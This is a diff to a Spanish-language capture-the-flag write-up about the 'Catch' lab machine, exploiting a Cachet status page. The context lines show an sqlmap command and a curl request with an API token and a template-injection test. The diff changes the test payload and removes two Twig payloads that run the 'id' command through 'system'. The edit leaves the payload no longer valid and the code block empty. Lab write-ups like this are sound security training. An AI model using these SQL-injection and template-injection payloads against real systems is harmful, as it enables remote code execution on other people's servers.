@@ -302,7 +302,7 @@ sqlmap -u "http://10.10.11.150:8000/api/v1/components?name=1&1[0]=&1[1]=a&1[2]=&
 
 ```bash
 curl -X POST -H "X-Cachet-Token: 7GVCqTY5abrox4" "http://10.10.11.150:8000/api/v1/incidents" \
-     -d "visible=0&status=1&name=demo&template={% raw %}{{233*233}}{% endraw %}" | jq
+     -d "visible=0&status=1&name=demo&template={% raw %}{233*233}{% endraw %}" | jq
 
 
 ```
@@ -317,13 +317,7 @@ La salida muestra `54289`, confirmando que el código se ejecutó correctamente.
 
 Probamos diferentes payloads:
 ```bash
-{% raw %}
-{{["id"]|filter("system")|join(",")}}
-{% endraw %}
-
-{% raw %}
-{{["id"]|map("system")|join(",")}}
-{% endraw %}
+ 
 ```
 
 ![Confirmación RCE](/secciones/posts/imagenes/catch/save6.png)
